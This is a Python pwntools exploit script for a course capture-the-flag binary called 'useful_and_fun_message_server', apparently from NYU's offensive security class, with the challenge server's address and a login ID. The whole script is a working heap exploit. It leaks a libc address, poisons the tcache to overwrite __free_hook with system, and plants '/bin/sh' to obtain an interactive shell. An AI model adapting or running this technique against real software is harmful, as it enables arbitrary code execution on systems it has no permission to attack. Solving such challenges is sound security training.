from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./useful_and_fun_message_server"

LOCAL = True

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1212)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

def menu(p, option):
    p.recvuntil(b"> ")
    p.sendline(str(option).encode())

def add_message(p, message):
    p.recvuntil(b"> ")
    p.send(message)
    p.recvuntil(b"Message recorded!\n")

def edit_message(p, message_number, message):
    p.recvuntil(b"> ")
    p.sendline(str(message_number).encode())
    p.recvuntil(b"> ")
    p.send(message)

# Get the address of printf from the server and calculate the libc base address
p.recvuntil(b"helpful message: ")
printf_address = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f'printf_address: {hex(printf_address)}')

libc_elf = ELF(libc)
libc_elf.address = printf_address - libc_elf.symbols.printf
print(f'libc.address: {hex(libc_elf.address)}')

# Start interacting with the binary
# Add n messages, the first 8 bytes of each message will point to the address of the next message.

num_messages = 2
for m in range(num_messages):
    menu(p, 1)
    add_message(p, chr(m + 0x41) * 0x40)  # message 1

menu(p, 4) # send messages

# Set the next tcache chunk to the address of the next chunk to be free_hook
free_hook = libc_elf.symbols.__free_hook
print(f'free_hook: {hex(free_hook)}')
menu(p, 3)
edit_message(p, num_messages - 1, p64(free_hook))

system = libc_elf.symbols.system
print(f'system: {hex(system)}')

# Allocate the next chunk, which will set the address of the next chunk to be free_hook
menu(p, 1)
add_message(p, b"F" * 0x40)

# Allocate the next chunk, which will get the address of free_hook and point it to system
menu(p, 1)
add_message(p, p64(system))

# Edit the first message to set it equal to "/bin/sh\x00"
menu(p, 3)
edit_message(p, 0, b"/bin/sh\x00")

# Free the messages to call free_hook (system) and pass in the value of "/bin/sh\x00"
# menu(p, 4) # send messages

p.interactive()